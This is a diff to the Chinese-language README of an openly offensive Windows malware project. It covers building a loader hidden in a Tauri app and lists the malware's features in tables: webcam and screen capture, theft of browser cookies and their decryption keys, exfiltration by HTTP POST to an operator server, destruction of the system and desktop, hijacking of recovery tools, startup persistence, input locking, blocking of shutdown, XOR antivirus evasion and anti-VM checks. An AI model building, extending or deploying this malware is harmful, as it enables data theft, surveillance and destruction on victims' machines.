@@ -23,7 +23,7 @@ copy x64\Release\loader.exe src-tauri\payload.exe
 # 编译 Tauri 前端
 bun tauri build
 ```
-产物：src-tauri\target\release\loader.exe
+产物：`src-tauri\target\release\loader.exe`
 
 ## 攻击行为
 
@@ -32,8 +32,8 @@ bun tauri build
 |------|------|
 | 桌面截图 | GDI 截屏 → PNG |
 | 摄像头拍照 | DirectShow 静默拍照 → PNG |
-| 系统信息 | CPU/OS/用户 |
-| 浏览器 Cookies | Chrome / Edge / Brave / Opera / Yandex / Firefox |
+| 系统信息 | CPU / OS / 用户 |
+| 浏览器 Cookies | Chrome / Edge / Brave / Opera / Yandex / Firefox + Local State 密钥 |
 | 浏览器历史 | Chrome / Edge / Brave / Opera / Yandex / Firefox |
 | 数据外传 | WinHTTP POST 至服务器 |
 
@@ -44,23 +44,23 @@ bun tauri build
 | 断 .exe 关联 | 删除 exefile 注册表 |
 | IFEO 劫持 | 40+ 恢复工具注入假 Debugger |
 | 系统瘫痪 | 清空 PATH / 禁用系统还原 / 停 50+ 关键服务 |
-| 桌面销毁 | 杀 explorer / 换鼠标键 / 删文件 / 嵌套目录 |
+| 桌面销毁 | 杀 explorer / 换鼠标键 / 删文件 / 嵌套目录 / 改壁纸 |
 | 持久化 | data.bat + open.cmd 写启动文件夹（开机自启） |
 | 锁输入 | `BlockInput` 锁键盘鼠标 |
-| BSOD | `condrv\kernelconnect` 触发蓝屏 |
-| 强制关机 | shutdown + ExitWindowsEx |
+| 反关机 | 拦截所有关机手段（开始菜单 / Ctrl+Alt+Del / WM_QUERYENDSESSION） |
 
 ### 视觉/听觉
 | 模块 | 说明 |
 |------|------|
-| 屏幕图标 | error/warning/info 随机填充全屏 |
+| 屏幕图标 | error / warning / info 随机填充全屏 |
 | 报警音 | MessageBeep 连续循环 |
-| 噪音 | 持续播放1kHz正弦波 |
+| 1kHz 噪音 | 合成正弦波持续播放 |
 | 壁纸 | 将摄像头拍摄的画面设为系统壁纸 |
 
-### 免杀
+### 免杀 / 反分析
 - 所有 WinExec 命令字符串 XOR 加密（Key: 0x55）
 - 编译后不存在明文攻击指令
+- 反虚拟机：检测 VMware / VirtualBox，弹窗退出
 
 ## 服务器部署
 
@@ -100,7 +100,7 @@ systemctl daemon-reload && systemctl enable --now cheese-receiver
 
 ## 配置项
 
-**服务器地址**：编辑 `injector/config.h`（已 gitignore，不会提交到仓库）
+**服务器地址**：编辑 `injector/config.h`（包含着gitignore中）
 ```cpp
 #pragma once
 #define SERVER_HOST L"你的IP"
@@ -109,7 +109,6 @@ systemctl daemon-reload && systemctl enable --now cheese-receiver
 
 其他可配置项：
 - **XOR Key**：`XKEY` 常量（默认 0x55）
-- **关机延迟**：`desktop_destroyer()` 中的 `Sleep(10000)`
 - **弹窗文字**：`desktop_destroyer()` 中的 `MessageBoxW`
 
 ## 注意
